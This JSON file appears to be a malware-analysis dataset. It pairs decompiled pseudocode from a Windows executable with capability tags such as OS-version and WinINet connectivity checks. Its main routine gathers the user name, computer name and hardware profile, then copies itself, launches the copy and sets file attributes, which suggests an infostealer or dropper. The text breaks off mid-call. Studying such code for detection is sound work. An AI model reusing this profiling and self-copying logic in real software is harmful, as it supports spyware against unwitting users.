{
    "0040571f": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040571f(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    \n    if ((arg_8h != '\\0') && (0xf < unaff_ESI[5])) {\n        arg_ch = *unaff_ESI;\n        if (unaff_EDI != 0) {\n            fcn.0040b880(unaff_ESI, arg_ch, unaff_EDI);\n        }\n        fcn.0040bd1b(arg_ch);\n    }\n    unaff_ESI[5] = 0xf;\n    unaff_ESI[4] = unaff_EDI;\n    *(unaff_EDI + unaff_ESI) = 0;\n    return;\n}\n",
        "token_count": 171
    },
    "0040bd90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040bd90(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != '\\0') {\n        fcn.0040e62f(*(param_1 + 4));\n    }\n    *(param_1 + 4) = 0;\n    *(param_1 + 8) = 0;\n    return;\n}\n",
        "token_count": 83
    },
    "00405915": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00405915(uint arg_8h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    int32_t *arg_8h_00;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uchar *unaff_ESI;\n    uint arg_8h_01;\n    uint noname_1;\n    uint uVar9;\n    uint uVar10;\n    uint in_stack_fffffc70;\n    uint in_stack_fffffc74;\n    uchar *in_stack_fffffc78;\n    uint in_stack_fffffc7c;\n    uchar *in_stack_fffffc80;\n    uchar *in_stack_fffffc84;\n    uint in_stack_fffffc88;\n    uint in_stack_fffffc8c;\n    uchar *in_stack_fffffc90;\n    uint in_stack_fffffc94;\n    uint in_stack_fffffc98;\n    uchar *in_stack_fffffc9c;\n    uint32_t in_stack_fffffca0;\n    uchar *arg_8h_02;\n    uint uStack836;\n    uint32_t uVar11;\n    uchar *arg_8h_03;\n    uint uStack812;\n    ushort uStack788;\n    uint uStack784;\n    uint32_t uStack776;\n    uint uStack772;\n    uint uStack768;\n    uchar auStack764 [8];\n    ushort uStack756;\n    uint uStack740;\n    uint uStack736;\n    uchar auStack676 [20];\n    uint8_t auStack656 [16];\n    uchar auStack640 [4];\n    uchar auStack636 [8];\n    uchar auStack628 [4];\n    uchar auStack624 [4];\n    uchar auStack620 [8];\n    uchar auStack612 [8];\n    uchar auStack604 [592];\n    uint32_t uStack12;\n    \n    uStack12 = *0x401304 ^ &stack0xfffffcec;\n    uStack784 = 0;\n    fcn.004071e8(&fcn.00405915::arg_8h);\n    uStack812 = 0x405959;\n    fcn.0040720e(0x403fd8);\n    uStack812 = 7;\n    uStack756 = 0;\n    puVar5 = &fcn.00405915::arg_8h;\n    uStack736 = 7;\n    uStack740 = 0;\n    fcn.004071e8(puVar5);\n    fcn.00406682(puVar5);\n    uStack788 = 0;\n    uStack768 = 7;\n    uStack772 = 0;\n    fcn.00407ce5();\n    fcn.00407f37(&stack0xfffffd5c, 0);\n    arg_8h_03 = &stack0xfffffd70;\n    fcn.00407f37(arg_8h_03, 0);\n    fcn.004073aa();\n    uVar11 = 1;\n    fcn.0040748c(1);\n    uStack836 = &stack0xfffffd80;\n    iVar3 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)();\n    if (iVar3 != -1) {\n        do {\n            pcVar1 = _sym.imp.KERNEL32.dll_lstrcmpiW;\n            iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(&stack0xfffffda4, 0x403fe0);\n            if (((((((iVar4 == 0) || (iVar4 = (*pcVar1)(&stack0xfffffd9c, 0x403fe4),  iVar4 == 0)) ||\n                   (iVar4 = (*pcVar1)(&stack0xfffffd9c, 0x403fec),  iVar4 == 0)) ||\n                  ((iVar4 = (*pcVar1)(&stack0xfffffd9c, 0x403ff4),  iVar4 == 0 ||\n                   (iVar4 = (*pcVar1)(&stack0xfffffd9c, 0x404004),  iVar4 == 0)))) ||\n                 (((iVar4 = (*pcVar1)(&stack0xfffffd9c, 0x404020),  iVar4 == 0 ||\n                   ((iVar4 = (*pcVar1)(&stack0xfffffd9c, 0x404028),  iVar4 == 0 ||\n                    (iVar4 = (*pcVar1)(&stack0xfffffd9c, 0x404044),  iVar4 == 0)))) ||\n                  (iVar4 = (*pcVar1)(&stack0xfffffd9c, 0x404050),  iVar4 == 0)))) ||\n                ((((iVar4 = (*pcVar1)(&stack0xfffffd9c, 0x404064),  iVar4 == 0 ||\n                   (iVar4 = (*pcVar1)(&stack0xfffffd9c, 0x404074),  iVar4 == 0)) ||\n                  (iVar4 = (*pcVar1)(&stack0xfffffd9c, 0x404088),  iVar4 == 0)) ||\n                 (((iVar4 = (*pcVar1)(&stack0xfffffd9c, 0x4040a4),  iVar4 == 0 ||\n                   (iVar4 = (*pcVar1)(&stack0xfffffd9c, 0x4040bc),  iVar4 == 0)) ||\n                  ((iVar4 = (*pcVar1)(&stack0xfffffd9c, 0x4040d4),  iVar4 == 0 ||\n                   ((iVar4 = (*pcVar1)(&stack0xfffffd9c, 0x4040ec),  iVar4 == 0 ||\n                    (iVar4 = (*pcVar1)(&stack0xfffffd9c, 0x404100),  iVar4 == 0)))))))))) ||\n               ((iVar4 = (*pcVar1)(&stack0xfffffd9c, 0x40411c),  iVar4 == 0 ||\n                ((iVar4 = (*pcVar1)(&stack0xfffffd9c, 0x40412c),  iVar4 == 0 ||\n                 (iVar4 = (*pcVar1)(&stack0xfffffd9c, 0x404144),  iVar4 == 0)))))) {\ncode_r0x00405cb1:\n                uStack836 = 0x1000000;\n            }\n            else {\n                fcn.0040720e(&stack0xfffffd9c);\n                in_stack_fffffc8c = 0x404154;\n                in_stack_fffffc88 = 0x405c04;\n                fcn.0040702c(0x404154);\n                uVar9 = 0x405c16;\n                fcn.0040b4c2(&stack0xfffffcf8);\n                uVar10 = 0x405c1c;\n                iVar4 = fcn.0040b6cf(in_stack_fffffc70, in_stack_fffffc74, in_stack_fffffc78, in_stack_fffffc7c, \n                                     in_stack_fffffc80, in_stack_fffffc84, in_stack_fffffc88, in_stack_fffffc8c, \n                                     in_stack_fffffc90, in_stack_fffffc94, in_stack_fffffc98, in_stack_fffffc9c, \n                                     in_stack_fffffca0);\n                if (iVar4 != 0) goto code_r0x00405cb1;\n                in_stack_fffffca0 = 0x405c38;\n                fcn.0040720e(&stack0xfffffd94);\n                in_stack_fffffc84 = 0x404164;\n                in_stack_fffffc80 = 0x405c4c;\n                fcn.0040702c(0x404164);\n                arg_8h_01 = 0x405c5b;\n                fcn.0040b4c2(&stack0xfffffcb8);\n                noname_1 = 0x405c61;\n                iVar4 = fcn.0040b6cf(uVar9, uVar10, in_stack_fffffc70, in_stack_fffffc74, in_stack_fffffc78, \n                                     in_stack_fffffc7c, in_stack_fffffc80, in_stack_fffffc84, in_stack_fffffc88, \n                                     in_stack_fffffc8c, in_stack_fffffc90, in_stack_fffffc94, in_stack_fffffc98);\n                if (iVar4 != 0) goto code_r0x00405cb1;\n                in_stack_fffffc9c = &stack0xfffffd8c;\n                in_stack_fffffc98 = 0x405c79;\n                fcn.0040720e(in_stack_fffffc9c);\n                in_stack_fffffc7c = 0x40416c;\n                in_stack_fffffc78 = 0x405c8d;\n                fcn.0040702c(0x40416c);\n                fcn.0040b4c2(&stack0xfffffd04);\n                iVar4 = fcn.0040b6cf(arg_8h_01, noname_1, uVar9, uVar10, in_stack_fffffc70, in_stack_fffffc74, \n                                     in_stack_fffffc78, in_stack_fffffc7c, in_stack_fffffc80, in_stack_fffffc84, \n                                     in_stack_fffffc88, in_stack_fffffc8c, in_stack_fffffc90);\n                if (iVar4 != 0) goto code_r0x00405cb1;\n            }\n            if ((uVar11 & 4) != 0) {\n                uVar11 = uVar11 & 0xfffffffb;\n                fcn.0040748c(1);\n            }\n            if ((uVar11 & 2) != 0) {\n                uVar11 = uVar11 & 0xfffffffd;\n                fcn.0040748c(1);\n            }\n            if ((uVar11 & 1) != 0) {\n                uVar11 = uVar11 & 0xfffffffe;\n                fcn.0040748c(1);\n            }\n            if (uStack836._3_1_ == '\\0') {\n                if ((auStack656[0] & 0x10) == 0) {\n                    fcn.0040720e(&stack0xfffffd9c);\n                    fcn.0040b4c2(&stack0xfffffcfc);\n                    uVar10 = 1;\n                    fcn.0040748c(1);\n                    uVar9 = 0x2e;\n                    fcn.00407179(0x2e);\n                    fcn.004070cc();\n                    arg_8h_02 = &stack0xfffffd90;\n                    fcn.0040720e(arg_8h_02);\n                    fcn.0040b4c2(&stack0xfffffcf0);\n                    in_stack_fffffc9c = 0x1;\n                    fcn.0040748c(1);\n                    in_stack_fffffc98 = 0x2d;\n                    fcn.00407179(0x2d);\n                    fcn.004070cc();\n                    fcn.00407b7c(&stack0xfffffd84);\n                    fcn.004073aa();\n                    in_stack_fffffc94 = 1;\n                    fcn.0040748c(1);\n                    in_stack_fffffc90 = 0x1c;\n                    uVar8 = 0;\n                    in_stack_fffffca0 = arg_8h_02 & 0xffffff;\n                    if ((*0x4147e8 - *0x4147e4) / 0x1c != 0) {\n                        iVar4 = 0;\n                        do {\n                            arg_8h_00 = iVar4 + *0x4147e4;\n                            if (0xf < arg_8h_00[5]) {\n                                arg_8h_00 = *arg_8h_00;\n                            }\n                            iVar7 = fcn.00407365(arg_8h_00);\n                            if (iVar7 == 0) {\n                                arg_8h_03 = CONCAT13(1, arg_8h_03);\n                            }\n                            uVar8 = uVar8 + 1;\n                            iVar4 = iVar4 + 0x1c;\n                        } while (uVar8 < (*0x4147e8 - *0x4147e4) / 0x1c);\n                    }\n                    cVar2 = fcn.00408146(0x40417c);\n                    if (cVar2 == '\\0') {\n                        in_stack_fffffc98 = 0x404188;\n                        in_stack_fffffc94 = 0x405eff;\n                        fcn.0040702c(0x404188);\n                        in_stack_fffffc78 = &stack0xfffffccc;\n                        fcn.00407008(in_stack_fffffc78);\n                        in_stack_fffffc74 = 0x405f13;\n                        iVar4 = fcn.0040b6cf(in_stack_fffffc78, in_stack_fffffc7c, in_stack_fffffc80, in_stack_fffffc84\n                                             , in_stack_fffffc88, in_stack_fffffc8c, in_stack_fffffc90, \n                                             in_stack_fffffc94, in_stack_fffffc98, in_stack_fffffc9c, in_stack_fffffca0\n                                             , uVar9, uVar10);\n                        if (iVar4 == 0) {\n                            in_stack_fffffc90 = unaff_ESI;\n                            if (uStack776 < 8) {\n                                in_stack_fffffc90 = &stack0xfffffce4;\n                            }\n                            fcn.0040720e(in_stack_fffffc90);\n                            in_stack_fffffc8c = 0x405f3f;\n                            fcn.00406886(in_stack_fffffc90, in_stack_fffffc94, in_stack_fffffc98, in_stack_fffffc9c, \n                                         in_stack_fffffca0, uVar9);\n                        }\n                    }\n                    fcn.0040571f(1);\n                    fcn.0040571f(1);\n                }\n                else {\n                    puVar5 = fcn.00407b7c(&stack0xfffffd9c);\n                    if (-puVar5[4] - 1 < 2) {\n                        fcn.0040b79e(0x404554);\n                        pcVar1 = swi(3);\n                        (*pcVar1)();\n                        return;\n                    }\n                    iVar4 = puVar5[4] + 1;\n                    cVar2 = fcn.00407713(0);\n                    if (cVar2 != '\\0') {\n                        puVar6 = puVar5;\n                        if (7 < puVar5[5]) {\n                            puVar6 = *puVar5;\n                        }\n                        *(puVar6 + puVar5[4] * 2) = 0x5c;\n                        puVar5[4] = iVar4;\n                        if (7 < puVar5[5]) {\n                            puVar5 = *puVar5;\n                        }\n                        *(puVar5 + iVar4 * 2) = 0;\n                    }\n                    fcn.00407ccb();\n                    fcn.004073aa();\n                    fcn.0040748c(1);\n                    in_stack_fffffca0 = 0x405da5;\n                    fcn.0040748c(1);\n                    in_stack_fffffc84 = &stack0xfffffcd8;\n                    fcn.004071e8(in_stack_fffffc84);\n                    fcn.00406682(in_stack_fffffc84);\n                    in_stack_fffffc80 = &stack0xfffffcd4;\n                    fcn.004071e8(in_stack_fffffc80);\n                    in_stack_fffffc7c = 0x405dca;\n                    fcn.00405915(in_stack_fffffc80);\n                }\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(arg_8h_03, &stack0xfffffd70);\n        } while (iVar4 != 0);\n        (*_sym.imp.KERNEL32.dll_FindClose)(iVar3);\n    }\n    uVar9 = 1;\n    fcn.0040748c(1);\n    fcn.0040748c(1);\n    fcn.0040748c(1);\n    fcn.0040748c(1);\n    fcn.0040b864(uVar9);\n    return;\n}\n",
        "token_count": 3689
    },
    "00407136": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407136(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *in_EAX;\n    uint *puVar1;\n    int32_t *unaff_EBX;\n    \n    puVar1 = in_EAX;\n    if (0xf < in_EAX[5]) {\n        puVar1 = *in_EAX;\n    }\n    if (arg_8h == 0) {\n        arg_8h = 0;\n    }\n    else {\n        arg_8h = arg_8h - puVar1;\n    }\n    fcn.004070cc();\n    if (0xf < in_EAX[5]) {\n        in_EAX = *in_EAX;\n    }\n    *unaff_EBX = in_EAX + arg_8h;\n    return;\n}\n",
        "token_count": 180
    },
    "0040748c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040748c(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    \n    if ((arg_8h != '\\0') && (7 < unaff_ESI[5])) {\n        arg_ch = *unaff_ESI;\n        if (unaff_EDI != 0) {\n            fcn.0040b880(unaff_ESI, arg_ch, unaff_EDI * 2);\n        }\n        fcn.0040bd1b(arg_ch);\n    }\n    unaff_ESI[5] = 7;\n    unaff_ESI[4] = unaff_EDI;\n    *(unaff_ESI + unaff_EDI * 2) = 0;\n    return;\n}\n",
        "token_count": 175
    },
    "00407713": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00407713(uint arg_8h)\n\n{\n    uint *in_EAX;\n    uint32_t unaff_EBX;\n    \n    if (0x7ffffffe < unaff_EBX) {\n        fcn.0040b79e(0x404554);\n    }\n    if (in_EAX[5] < unaff_EBX) {\n        fcn.00407977(in_EAX, unaff_EBX, in_EAX[4]);\n    }\n    else if ((arg_8h == '\\0') || (7 < unaff_EBX)) {\n        if (unaff_EBX == 0) {\n            in_EAX[4] = 0;\n            if (7 < in_EAX[5]) {\n                in_EAX = *in_EAX;\n            }\n            *in_EAX = 0;\n        }\n    }\n    else {\n        fcn.0040748c(1);\n    }\n    return unaff_EBX != 0;\n}\n",
        "token_count": 215
    },
    "004078d3": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004078d3(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    int32_t *arg_ch_00;\n    int32_t in_ECX;\n    uint32_t unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    bool in_SF;\n    uint var_18h;\n    \n    if (!in_SF) {\n        unaff_ESI = *(unaff_EBP + 8);\n        unaff_EBX = *(unaff_EBP + 0xc);\n        if (*(unaff_EBP + 0x10) != 0) {\n            arg_ch_00 = unaff_ESI;\n            if (0xf < unaff_ESI[5]) {\n                arg_ch_00 = *unaff_ESI;\n            }\n            fcn.0040b880(*(unaff_EBP + -0x18), arg_ch_00, *(unaff_EBP + 0x10));\n        }\n        fcn.0040571f(1);\n        in_ECX = *(unaff_EBP + -0x18);\n        *unaff_ESI = in_ECX;\n        unaff_ESI[5] = unaff_EBX;\n        in_EAX = *(unaff_EBP + 0x10);\n        unaff_ESI[4] = in_EAX;\n    }\n    if (unaff_EBX < 0x10) {\n        in_ECX = unaff_ESI;\n    }\n    *(in_ECX + in_EAX) = 0;\n    fcn.00412132();\n    return;\n}\n",
        "token_count": 362
    },
    "0040793c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040793c(uint *arg_8h)\n\n{\n    uint *in_EAX;\n    uint *puVar1;\n    \n    if (arg_8h != NULL) {\n        puVar1 = in_EAX;\n        if (0xf < in_EAX[5]) {\n            puVar1 = *in_EAX;\n        }\n        if (puVar1 <= arg_8h) {\n            puVar1 = in_EAX;\n            if (0xf < in_EAX[5]) {\n                puVar1 = *in_EAX;\n            }\n            in_EAX = in_EAX[4] + puVar1;\n            if (arg_8h < in_EAX) {\n                return CONCAT31(in_EAX >> 8, 1);\n            }\n        }\n    }\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 189
    },
    "00407a65": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00407a65(uint *arg_8h)\n\n{\n    uint *in_EAX;\n    uint *puVar1;\n    \n    if (arg_8h != NULL) {\n        puVar1 = in_EAX;\n        if (7 < in_EAX[5]) {\n            puVar1 = *in_EAX;\n        }\n        if (puVar1 <= arg_8h) {\n            puVar1 = in_EAX;\n            if (7 < in_EAX[5]) {\n                puVar1 = *in_EAX;\n            }\n            in_EAX = puVar1 + in_EAX[4] * 2;\n            if (arg_8h < in_EAX) {\n                return CONCAT31(in_EAX >> 8, 1);\n            }\n        }\n    }\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 190
    },
    "00408d4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408d4c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint arg_ch;\n    uint noname_2;\n    uint arg_8h_01;\n    uint in_stack_fffffdd0;\n    uint in_stack_fffffdd4;\n    uint in_stack_fffffdd8;\n    uint in_stack_fffffddc;\n    uint in_stack_fffffde0;\n    uint pcbBuffer;\n    uint lpHwProfileInfo;\n    uint var_1e0h;\n    uint var_160h;\n    uint var_144h;\n    uint var_128h;\n    uint lpBuffer;\n    uint32_t var_8h;\n    \n    var_8h = *0x401304 ^ &stack0xfffffffc;\n    fcn.004089f9();\n    fcn.00407291();\n    fcn.0040571f(1);\n    cVar1 = fcn.00408146(0x404631);\n    if (cVar1 == '\\0') {\n        fcn.00408aba();\n        fcn.00407291();\n        fcn.0040571f(1);\n    }\n    else {\n        fcn.0040d730(0x40471c);\n        fcn.00407523();\n        fcn.0040d730(0x40471c);\n        fcn.00407523();\n    }\n    pcbBuffer = 0x100;\n    (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&fcn.00408d4c::lpBuffer, &fcn.00408d4c::pcbBuffer);\n    fcn.0040d730(&fcn.00408d4c::lpBuffer);\n    fcn.00407523();\n    pcbBuffer = 0x100;\n    (*_sym.imp.KERNEL32.dll_GetComputerNameA)(&fcn.00408d4c::lpBuffer, &fcn.00408d4c::pcbBuffer);\n    fcn.0040d730(&fcn.00408d4c::lpBuffer);\n    fcn.00407523();\n    fcn.00408bf7();\n    iVar2 = (*_sym.imp.ADVAPI32.dll_GetCurrentHwProfileA)(&fcn.00408d4c::lpHwProfileInfo);\n    if (iVar2 != 0) {\n        fcn.0040d730(&fcn.00408d4c::var_1e0h);\n        fcn.00407523();\n    }\n    fcn.00408ca5();\n    arg_8h_01 = 0x404728;\n    fcn.0040702c(0x404728);\n    noname_2 = 0x408eaf;\n    fcn.0040b24c(arg_8h_01, in_stack_fffffdd0, in_stack_fffffdd4, in_stack_fffffdd8, in_stack_fffffddc, \n                 in_stack_fffffde0);\n    fcn.00407291();\n    fcn.0040571f(1);\n    if (arg_8h != '\\0') {\n        arg_ch = 0x404e6c;\n        fcn.0040702c(0x404e6c);\n        fcn.0040b535(7, arg_ch, noname_2, arg_8h_01, in_stack_fffffdd0, in_stack_fffffdd4);\n        arg_8h_00 = 0x404e94;\n        fcn.0040702c(0x404e94);\n        fcn.0040b24c(arg_8h_00, arg_ch, noname_2, arg_8h_01, in_stack_fffffdd0, in_stack_fffffdd4);\n        fcn.00407c40();\n        fcn.00407291();\n        fcn.0040571f(1);\n        fcn.0040571f(1);\n        fcn.0040571f(1);\n    }\n    fcn.0040b864(in_stack_fffffddc);\n    return;\n}\n",
        "token_count": 920
    },
    "null": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl main(int32_t argv, uint envp)\n\n{\n    bool bVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint in_stack_fffffcec;\n    uint in_stack_fffffcf0;\n    uint in_stack_fffffcf4;\n    uint in_stack_fffffcf8;\n    uint in_stack_fffffcfc;\n    uint in_stack_fffffd00;\n    uint in_stack_fffffd08;\n    uchar *arg_8h;\n    uint uVar7;\n    uint uVar8;\n    uint in_stack_fffffd24;\n    uint in_stack_fffffd28;\n    uint in_stack_fffffd2c;\n    uint arg_24h;\n    uint in_stack_fffffd30;\n    uint noname_8;\n    uint in_stack_fffffd34;\n    uint arg_24h_00;\n    uint in_stack_fffffd38;\n    uint noname_8_00;\n    uint arg_24h_01;\n    uint noname_8_01;\n    uint in_stack_fffffd44;\n    uint in_stack_fffffd48;\n    uint in_stack_fffffd4c;\n    uint in_stack_fffffd50;\n    uint in_stack_fffffd78;\n    uint in_stack_fffffd7c;\n    uint in_stack_fffffd80;\n    uint in_stack_fffffd84;\n    uint in_stack_fffffd88;\n    uint in_stack_fffffd8c;\n    uint uVar9;\n    uint uVar10;\n    uint in_stack_fffffdbc;\n    uint in_stack_fffffdc0;\n    uint in_stack_fffffdc4;\n    uint in_stack_fffffdc8;\n    uint in_stack_fffffdcc;\n    uint uVar11;\n    uint uVar12;\n    uint in_stack_fffffdd4;\n    uchar auStack516 [4];\n    uint uStack512;\n    uint uStack508;\n    uint uStack504;\n    uchar auStack496 [8];\n    uchar uStack488;\n    uint uStack472;\n    uint uStack468;\n    uchar auStack396 [32];\n    uchar auStack364 [352];\n    uint32_t uStack12;\n    \n    uStack12 = *0x401304 ^ &stack0xfffffdfc;\n    uStack512 = envp;\n    uStack508 = 0;\n    (*_sym.imp.KERNEL32.dll_CreateMutexA)();\n    (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n    iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if (iVar5 == 0xb7) {\n        in_stack_fffffdd4 = 0x40a609;\n        (*_sym.imp.KERNEL32.dll_ExitThread)();\n    }\n    uVar10 = 0x405040;\n    bVar2 = false;\n    bVar1 = false;\n    fcn.0040702c(0x405040);\n    uVar9 = 0x40a62a;\n    fcn.0040a12b(uVar10, in_stack_fffffdbc, in_stack_fffffdc0, in_stack_fffffdc4, in_stack_fffffdc8, in_stack_fffffdcc);\n    uVar12 = 0x40a634;\n    cVar4 = fcn.00408146(in_stack_fffffdd4);\n    if (cVar4 != '\\0') {\n        bVar2 = true;\n        bVar1 = false;\n        uVar9 = 0x405044;\n        fcn.0040702c(0x405044);\n        fcn.0040a12b(uVar9, uVar10, in_stack_fffffdbc, in_stack_fffffdc0, in_stack_fffffdc4, in_stack_fffffdc8);\n        uVar11 = 0x40a65f;\n        cVar4 = fcn.00408146(uVar12);\n        if (cVar4 != '\\0') {\n            bVar2 = true;\n            bVar1 = true;\n            uVar12 = 0x40504c;\n            fcn.0040702c(0x40504c);\n            fcn.0040a12b(uVar12, uVar9, uVar10, in_stack_fffffdbc, in_stack_fffffdc0, in_stack_fffffdc4);\n            cVar4 = fcn.00408146(uVar11);\n            bVar3 = true;\n            if (cVar4 != '\\0') goto code_r0x0040a69c;\n        }\n    }\n    bVar3 = false;\ncode_r0x0040a69c:\n    if (bVar1) {\n        fcn.0040571f(1);\n    }\n    if (bVar2) {\n        fcn.0040571f(1);\n    }\n    fcn.0040571f(1);\n    if (bVar3) {\n        fcn.0040b139();\n        fcn.004081cb();\n        fcn.00408d4c(1);\n        fcn.004090b9();\n        fcn.00409263();\n        fcn.004092b9();\n        fcn.00409616();\n        fcn.004096ed();\n        fcn.004057c3();\n        fcn.00408f61(&stack0xfffffe74);\n        fcn.00405fd0();\n        fcn.0040af03();\n        fcn.0040b017();\n        fcn.0040b68c();\n        fcn.0040d7bb(0x405050);\n        fcn.00407fd4(0x405050);\n        fcn.00407ccb();\n        (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)();\n        uStack504 = 0xf;\n        uStack508 = 0;\n        fcn.00407523();\n        fcn.0040b44d(&stack0xfffffe10);\n        (*_sym.imp.KERNEL32.dll_CopyFileW)();\n        fcn.0040748c(1);\n        fcn.0040571f(1);\n        fcn.0040748c(1);\n        fcn.0040748c(1);\n        uVar12 = 0x405074;\n        uVar9 = fcn.0040b68c();\n        fcn.0040b4c2(uVar9);\n        uVar10 = 0x405088;\n        uVar9 = fcn.00408978(0x405090);\n        fcn.00407c84(uVar9, uVar10);\n        uVar9 = fcn.00407c40();\n        fcn.00407c84(uVar9, uVar12);\n        (*_sym.imp.SHELL32.dll_ShellExecuteA)();\n        fcn.0040571f(1);\n        fcn.0040571f(1);\n        fcn.0040571f(1);\n        fcn.0040571f(1);\n        fcn.0040571f(1);\n        fcn.0040748c(1);\n        fcn.0040b68c();\n        fcn.0040d7bb(0x405050);\n        fcn.00407fd4(0x405050);\n        fcn.00407ccb();\n        (*_sym.imp.KERNEL32.dll_SetFileAttributesW)();\n        fcn.0040748c(1);\n        fcn.0040748c(1);\n        noname_8_01 = 0x402024;\n        arg_24h_01 = 0x40a91d;\n        fcn.00407008(0x402024);\n        uVar8 = 0x405040;\n        fcn.0040702c(0x405040);\n        uVar7 = 0x40a931;\n        fcn.0040a082(uVar8, in_stack_fffffd24, in_stack_fffffd28, in_stack_fffffd2c, in_stack_fffffd30, \n                     in_stack_fffffd34, in_stack_fffffd38, arg_24h_01, noname_8_01, in_stack_fffffd44, in_stack_fffffd48\n                     , in_stack_fffffd4c, in_stack_fffffd50);\n        noname_8_00 = 0x401eb8;\n        arg_24h_00 = 0x40a940;\n        fcn.00407008(0x401eb8);\n        uVar11 = 0x405044;\n        fcn.0040702c(0x405044);\n        uVar12 = 0x40a954;\n        fcn.0040a082(uVar11, uVar7, uVar8, in_stack_fffffd24, in_stack_fffffd28, in_stack_fffffd2c, in_stack_fffffd30, \n                     arg_24h_00, noname_8_00, arg_24h_01, noname_8_01, 